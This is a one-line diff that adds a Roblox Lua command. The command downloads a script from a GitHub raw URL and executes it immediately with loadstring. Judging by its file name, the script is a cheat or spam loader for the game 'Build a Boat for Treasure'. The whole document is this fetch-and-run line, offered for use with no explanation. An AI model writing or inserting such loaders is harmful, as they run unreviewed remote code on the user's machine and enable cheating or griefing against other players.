@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/build-a-boat-for-treasure-spam2-5brwir3lewjmim.lua"))()
